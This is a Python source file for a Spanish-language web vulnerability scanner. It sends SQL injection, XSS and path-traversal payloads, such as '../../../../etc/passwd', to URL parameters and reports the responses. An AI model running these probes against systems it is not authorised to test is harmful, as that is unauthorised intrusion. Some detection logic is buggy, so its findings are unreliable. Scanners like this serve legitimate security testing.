#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MX-WEBSCAN v1.0 - Escáner OWASP Top 10 Hecho en México
🇲🇽 Por los compas, para los compas - Con huevos 🥚🔥
"""

import requests
import threading
import queue
import argparse
from datetime import datetime
import json
import os
import sys
import time
import re
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urljoin
from colorama import init, Fore, Style

# Inicializar colorama
init(autoreset=True)

BANNER = f"""
{Fore.GREEN}╔══════════════════════════════════════════════════════════╗
║     {Fore.WHITE}MX-WEBSCAN v1.0 - HECHO EN MÉXICO {Fore.GREEN}                     ║
║     {Fore.YELLOW}Escáner OWASP Top 10 - Más cabrón que Kali {Fore.GREEN}            ║
║     {Fore.RED}SQLi • XSS • LFI - Con huevos 🥚🔥 {Fore.GREEN}                      ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

class MXWebScan:
    def __init__(self, target_url, threads=10, timeout=10, user_agent=None):
        self.target = target_url
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.results = {
            'sql_injection': [],
            'xss': [],
            'lfi': [],
            'info': []
        }
        self.stats = {
            'total_requests': 0,
            'vulnerabilities_found': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Configurar headers
        self.session.headers.update({
            'User-Agent': user_agent or 'MX-WEBSCAN/1.0 (Hecho en Mexico)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Cargar payloads
        self.payloads = self.cargar_payloads()
        
        # Cola para threading
        self.queue = queue.Queue()
        
    def cargar_payloads(self):
        """Carga payloads desde archivos"""
        print(f"{Fore.CYAN}[+] Cargando payloads...{Style.RESET_ALL}")
        
        payloads = {}
        base_path = Path(__file__).parent / 'payloads'
        
        archivos = {
            'sql': 'sql_injection.txt',
            'xss': 'xss.txt',
            'lfi': 'lfi.txt'
        }
        
        for key, filename in archivos.items():
            try:
                file_path = base_path / filename
                if not file_path.exists():
                    print(f"{Fore.YELLOW}[!] No se encontró {filename}, usando payloads por defecto{Style.RESET_ALL}")
                    payloads[key] = self.get_default_payloads(key)
                else:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        
                    # Filtrar comentarios y líneas vacías
                    payloads[key] = []
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads[key].append(line)
                    
                    print(f"{Fore.GREEN}[+] Cargados {len(payloads[key])} payloads de {filename}{Style.RESET_ALL}")
                    
            except Exception as e:
                print(f"{Fore.RED}[!] Error cargando {filename}: {str(e)}{Style.RESET_ALL}")
                payloads[key] = self.get_default_payloads(key)
        
        return payloads
    
    def get_default_payloads(self, tipo):
        """Payloads por defecto si no hay archivos"""
        if tipo == 'sql':
            return ["'", '"', "' or 1=1--", '" or 1=1--', "' union select 1,2,3--"]
        elif tipo == 'xss':
            return ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>']
        elif tipo == 'lfi':
            return ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd', '..\\..\\..\\windows\\win.ini']
        return []
    
    def discover_parameters(self):
        """Descubre parámetros en la URL y formularios"""
        print(f"{Fore.CYAN}[+] Descubriendo parámetros en {self.target}{Style.RESET_ALL}")
        
        params = {}
        
        # Extraer parámetros de la URL
        parsed = urlparse(self.target)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key, values in query_params.items():
                params[key] = values[0] if values else ''
                print(f"{Fore.GREEN}  [URL] {key}={params[key]}{Style.RESET_ALL}")
        
        # Si no hay parámetros, usar algunos comunes
        if not params:
            common_params = ['id', 'page', 'cat', 'product', 'view', 'file', 'path', 'redirect', 
                           'url', 'site', 'show', 'document', 'folder', 'root', 'name', 'user',
                           'search', 'q', 's', 'query', 'term', 'keyword', 'lang', 'language']
            for param in common_params[:5]:  # Solo 5 para no hacer demasiadas pruebas
                params[param] = '1'
                print(f"{Fore.YELLOW}  [AUTO] {param}=1{Style.RESET_ALL}")
        
        return params
    
    def test_sql_injection(self, url, param, value):
        """Prueba SQL injection en un parámetro"""
        for payload in self.payloads['sql']:
            try:
                self.stats['total_requests'] += 1
                
                # Construir URL con payload
                test_value = value.replace('FUZZ', payload) if 'FUZZ' in value else value + payload
                params = {param: test_value}
                
                # Probar GET
                start = time.time()
                response = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=False)
                response_time = time.time() - start
                
                # Detectar SQLi
                content = response.text.lower()
                
                # Indicadores de SQLi
                sql_errors = [
                    'sql', 'mysql', 'syntax error', 'unclosed quotation',
                    'you have an error', 'warning: mysql', 'odbc', 'driver',
                    'microsoft ole db', 'postgresql error', 'pg_',
                    'oracle error', 'ora-', 'pl/sql', 'sqlite_error',
                    'sqlite3.', 'division by zero', 'unknown column'
                ]
                
                is_vulnerable = False
                severity = 'low'
                
                # Detección por errores SQL
                if any(error in content for error in sql_errors):
                    is_vulnerable = True
                    severity = 'high'
                    print(f"{Fore.RED}[SQLi] Error detectado en {param} con: {payload[:30]}...{Style.RESET_ALL}")
                
                # Detección por time-based
                if response_time > 5:
                    is_vulnerable = True
                    severity = 'medium'
                    print(f"{Fore.YELLOW}[SQLi Time] Respuesta lenta ({response_time:.2f}s) en {param}{Style.RESET_ALL}")
                
                # Detección por boolean-based
                if '1=1' in payload and '1=2' not in self.payloads['sql']:
                    # Probar variante con 1=2 para comparar
                    params_false = {param: value.replace('1=1', '1=2')}
                    try:
                        response_false = self.session.get(url, params=params_false, timeout=self.timeout)
                        if len(response.text) != len(response_false.text):
                            is_vulnerable = True
                            severity = 'high'
                            print(f"{Fore.RED}[SQLi Blind] Diferencia en longitud detectada en {param}{Style.RESET_ALL}")
                    except:
                        pass
                
                if is_vulnerable:
                    self.results['sql_injection'].append({
                        'parametro': param,
                        'payload': payload[:100],
                        'tiempo': round(response_time, 2),
                        'codigo': response.status_code,
                        'severidad': severity,
                        'url': response.url
                    })
                    self.stats['vulnerabilities_found'] += 1
                    
            except requests.exceptions.Timeout:
                # Timeout puede indicar time-based SQLi
                self.results['sql_injection'].append({
                    'parametro': param,
                    'payload': payload[:100],
                    'tiempo': self.timeout,
                    'codigo': 0,
                    'severidad': 'medium',
                    'url': url,
                    'nota': 'Timeout - Posible time-based SQLi'
                })
                self.stats['vulnerabilities_found'] += 1
                print(f"{Fore.YELLOW}[SQLi] Timeout en {param} con: {payload[:30]}...{Style.RESET_ALL}")
                
            except Exception as e:
                # Error de conexión, ignorar
                pass
    
    def test_xss(self, url, param, value):
        """Prueba XSS en un parámetro"""
        for payload in self.payloads['xss']:
            try:
                self.stats['total_requests'] += 1
                
                # Probar GET
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=self.timeout)
                
                # Verificar si el payload se refleja sin codificar
                if payload in response.text:
                    # Verificar si está en contexto HTML
                    if payload in response.text and '<' in payload and '>' in payload:
                        # Verificar si está escapado
                        html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                        if html_encoded not in response.text:
                            self.results['xss'].append({
                                'parametro': param,
                                'payload': payload[:100],
                                'codigo': response.status_code,
                                'contexto': 'HTML',
                                'severidad': 'medium',
                                'url': response.url
                            })
                            self.stats['vulnerabilities_found'] += 1
                            print(f"{Fore.YELLOW}[XSS] Posible en {param} con: {payload[:30]}...{Style.RESET_ALL}")
                            break  # Una vulnerabilidad por parámetro es suficiente
                            
            except Exception as e:
                continue
    
    def test_lfi(self, url, param, value):
        """Prueba Local File Inclusion"""
        for payload in self.payloads['lfi']:
            try:
                self.stats['total_requests'] += 1
                
                # Probar GET
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=self.timeout)
                content = response.text
                
                # Indicadores de LFI exitoso
                lfi_indicators = [
                    'root:x:', 'daemon:x:', 'bin:x:', 'sys:x:',  # Linux /etc/passwd
                    '[extensions]',  # Windows win.ini
                    'for 16-bit app support',  # Windows
                    'boot loader',  # boot.ini
                    'Microsoft Windows',  # win.ini
                    '<?php',  # PHP files
                    'MySQL dump',  # SQL files
                    '<html',  # HTML files
                    '# Autogenerated by Chef',  # Config files
                    ';' in payload and ';' in content[:100]  # Potential code
                ]
                
                if any(indicator in content for indicator in lfi_indicators):
                    self.results['lfi'].append({
                        'parametro': param,
                        'payload': payload[:100],
                        'codigo': response.status_code,
                        'indicador': next((ind for ind in lfi_indicators if ind in content), 'Unknown'),
                        'severidad': 'high',
                        'url': response.url
                    })
                    self.stats['vulnerabilities_found'] += 1
                    print(f"{Fore.MAGENTA}[LFI] Posible en {param} con: {payload[:30]}...{Style.RESET_ALL}")
                    break  # Una vulnerabilidad por parámetro es suficiente
                    
            except Exception as e:
                continue
    
    def scan_worker(self):
        """Worker para threading"""
        while True:
            try:
                url, param, value = self.queue.get(timeout=5)
                
                # Probar diferentes tipos de vulnerabilidades
                self.test_sql_injection(url, param, value)
                self.test_xss(url, param, value)
                self.test_lfi(url, param, value)
                
            except queue.Empty:
                break
            except Exception as e:
                continue
            finally:
                self.queue.task_done()
    
    def scan(self):
        """Ejecuta el escaneo completo"""
        self.stats['start_time'] = datetime.now()
        print(f"{Fore.CYAN}[+] Iniciando escaneo de {self.target}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Usando {self.threads} hilos{Style.RESET_ALL}")
        
        # Descubrir parámetros
        params = self.discover_parameters()
        
        if not params:
            print(f"{Fore.RED}[!] No se encontraron parámetros para probar{Style.RESET_ALL}")
            return
        
        # Crear cola de trabajo
        total_tests = len(params) * (len(self.payloads['sql']) + len(self.payloads['xss']) + len(self.payloads['lfi']))
        print(f"{Fore.CYAN}[+] Total de pruebas a realizar: {total_tests}{Style.RESET_ALL}")
        
        for param, value in params.items():
            self.queue.put((self.target, param, value))
        
        # Iniciar workers
        threads = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.scan_worker)
            t.start()
            threads.append(t)
        
        # Esperar a que termine
        self.queue.join()
        
        for t in threads:
            t.join()
        
        self.stats['end_time'] = datetime.now()
        
        # Mostrar resumen
        self.print_summary()
        
        # Generar reporte
        self.generate_report()
    
    def print_summary(self):
        """Muestra resumen del escaneo"""
        duration = self.stats['end_time'] - self.stats['start_time']
        
        print(f"\n{Fore.CYAN}═══════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.WHITE}           RESUMEN DEL ESCANEO         {Style.RESET_ALL}")
        print(f"{Fore.CYAN}═══════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Duración: {duration}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Peticiones totales: {self.stats['total_requests']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Vulnerabilidades encontradas: {self.stats['vulnerabilities_found']}{Style.RESET_ALL}")
        print(f"\n{Fore.RED}SQL Injection: {len(self.results['sql_injection'])}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}XSS: {len(self.results['xss'])}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}LFI: {len(self.results['lfi'])}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}═══════════════════════════════════════{Style.RESET_ALL}")
    
    def generate_report(self, format='html'):
        """Genera reporte en HTML"""
        if format == 'html':
            self.generate_html_report()
    
    def generate_html_report(self):
        """Genera reporte HTML"""
        template_path = Path(__file__).parent / 'reports' / 'template.html'
        
        try:
            with open(template_path, 'r', encoding='utf-8') as f:
                template = f.read()
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Template no encontrado, usando template por defecto{Style.RESET_ALL}")
            template = """
            <html>
            <head><title>MX-WEBSCAN Report</title></head>
            <body>
                <h1>MX-WEBSCAN Report</h1>
                <p>Target: {{target}}</p>
                <p>Date: {{date}}</p>
            </body>
            </html>
            """
        
        # Calcular estadísticas
        duration = self.stats['end_time'] - self.stats['start_time']
        duration_str = str(duration).split('.')[0]  # Quitar microsegundos
        
        # Generar HTML de vulnerabilidades
        vuln_html = ""
        
        if self.results['sql_injection']:
            vuln_html += '<div class="vuln-group sql"><h3>⚠️ SQL Injection (' + str(len(self.results['sql_injection'])) + ')</h3>'
            for v in self.results['sql_injection']:
                vuln_html += f'''
                <div class="vuln-card critical">
                    <div class="vuln-header">
                        <span class="vuln-param">Parámetro: {v['parametro']}</span>
                        <span class="badge critical">CRÍTICO</span>
                    </div>
                    <div class="vuln-payload">Payload: {v['payload']}</div>
                    <div class="vuln-details">
                        <div>Código HTTP: {v['codigo']}</div>
                        <div>Tiempo: {v.get('tiempo', 'N/A')}s</div>
                    </div>
                    <div style="margin-top: 10px; color: #dc3545;">
                        <strong>Riesgo:</strong> Acceso no autorizado a base de datos
                    </div>
                </div>
                '''
            vuln_html += '</div>'
        
        if self.results['lfi']:
            vuln_html += '<div class="vuln-group lfi"><h3>📁 Local File Inclusion (' + str(len(self.results['lfi'])) + ')</h3>'
            for v in self.results['lfi']:
                vuln_html += f'''
                <div class="vuln-card high">
                    <div class="vuln-header">
                        <span class="vuln-param">Parámetro: {v['parametro']}</span>
                        <span class="badge high">ALTO</span>
                    </div>
                    <div class="vuln-payload">Payload: {v['payload']}</div>
                    <div class="vuln-details">
                        <div>Código HTTP: {v['codigo']}</div>
                    </div>
                    <div style="margin-top: 10px; color: #fd7e14;">
                        <strong>Riesgo:</strong> Lectura de archivos del sistema
                    </div>
                </div>
                '''
            vuln_html += '</div>'
        
        if self.results['xss']:
            vuln_html += '<div class="vuln-group xss"><h3>💉 Cross-Site Scripting (' + str(len(self.results['xss'])) + ')</h3>'
            for v in self.results['xss']:
                vuln_html += f'''
                <div class="vuln-card medium">
                    <div class="vuln-header">
                        <span class="vuln-param">Parámetro: {v['parametro']}</span>
                        <span class="badge medium">MEDIO</span>
                    </div>
                    <div class="vuln-payload">Payload: {v['payload']}</div>
                    <div class="vuln-details">
                        <div>Código HTTP: {v['codigo']}</div>
                    </div>
                    <div style="margin-top: 10px; color: #ffc107;">
                        <strong>Riesgo:</strong> Robo de cookies y sesiones
                    </div>
                </div>
                '''
            vuln_html += '</div>'
        
        # Reemplazar variables en template
        report = template.replace('{{target}}', self.target)
        report = report.replace('{{date}}', self.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S'))
        report = report.replace('{{duration}}', duration_str)
        report = report.replace('{{threads}}', str(self.threads))
        report = report.replace('{{critical_count}}', str(len(self.results['sql_injection'])))
        report = report.replace('{{high_count}}', str(len(self.results['lfi'])))
        report = report.replace('{{medium_count}}', str(len(self.results['xss'])))
        report = report.replace('{{low_count}}', '0')
        report = report.replace('{{total_count}}', str(self.stats['vulnerabilities_found']))
        report = report.replace('{{vulnerabilities}}', vuln_html)
        
        # Guardar reporte
        filename = f"mx-webscan_report_{self.stats['start_time'].strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[✔] Reporte generado: {filename}{Style.RESET_ALL}")
        return filename

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='MX-WEBSCAN - Escáner de vulnerabilidades web')
    parser.add_argument('--url', '-u', required=True, help='URL objetivo (ej: http://example.com/page.php)')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Número de hilos (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout en segundos (default: 10)')
    parser.add_argument('--user-agent', '-a', help='User-Agent personalizado')
    parser.add_argument('--no-banner', action='store_true', help='No mostrar banner')
    
    args = parser.parse_args()
    
    # Validar URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    try:
        # Crear escáner
        scanner = MXWebScan(
            target_url=args.url,
            threads=args.threads,
            timeout=args.timeout,
            user_agent=args.user_agent
        )
        
        # Ejecutar escaneo
        scanner.scan()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Escaneo interrumpido por el usuario{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
